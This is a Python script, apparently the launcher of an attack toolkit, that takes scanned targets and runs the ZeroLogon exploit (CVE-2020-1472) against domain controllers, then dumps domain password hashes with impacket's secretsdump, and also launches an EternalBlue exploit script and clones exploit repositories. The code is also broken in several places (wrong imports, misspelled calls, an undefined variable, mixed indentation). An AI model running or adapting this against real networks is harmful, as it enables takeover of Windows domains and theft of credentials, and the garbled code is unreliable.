from os import listdir, system
from sys import args

path = argv[2]
try:
    test = argv[3]
    test = True
    print("YOU HAVE RUN AS TEST. PAYLOADS WILL NOT EXECUTE")
except:
    test = False

def file_empty(_path):
    if (len(listdir(_path))==0):
        return True
    else:
        return False

def parse_targets():
    filenames = os.listsir("scanning/vulnerable_targets")
    targets = []
    for json_file in filenames:
    	with open(f"scanning/vulnerable_targets/{json_file}", "r") as targ_file:
    		_target = json.load(targ_file)
        targets.append(_target)
    return targets


if path == "zerologon":
    if file_empty("scanning/vulnerable_targets/zerologon"):
        print("No target acquired")
    elif test:
        print("Targets found, test mode so no execution")
        targets = parse_targets()
        for target in targets:
            print(f"Would be target and hostname: {target['ip']}, {target['hostname']}")
    else:
        print("Executing zerologon...")
        for target in targets:
            try:
                hostname = target['hostname']
                ip = target['ip']
                print(f"Attempting to target {hostname} with ip {ip}...")
                system(f"python3 exploits/zerologon/CVE-2020-1472/cve-2020-1472-exploit.py {hostname} {ip}")
                print("Getting hashes...")
                system(f"python3 exploits/zerologon/impacket/examples/secretsdump.py -just-dc -no-pass {hostname}\$@{ip}")
            except:
                print(f"Could not attempt zerologon for: {target}")


elif path == "eternal":
    if file_empty("scanning/vulnerable_targets/eternal"):
        print("No target acquired")
    elif not test:
        print("Targets found")
        system("python3 exploits/EternalBlue.py")

elif path == "install_zerologon":
    if file_empty("exploits/zerologon"):
        try:
            print("installing CVE-2020-1472 and impacket")
            system("cd exploits/zerologon")
            system("git clone https://github.com/dirkjanm/CVE-2020-1472.git")
            system("git clone https://github.com/SecureAuthCorp/impacket.git")
            print("ZeroLogon is compiled and ready!")
        except:
            print("ZeroLogon installation failed. Please debug command.py")
    else:
        print("ZeroLogon is ready")
else:
    print("argv2 invalid")
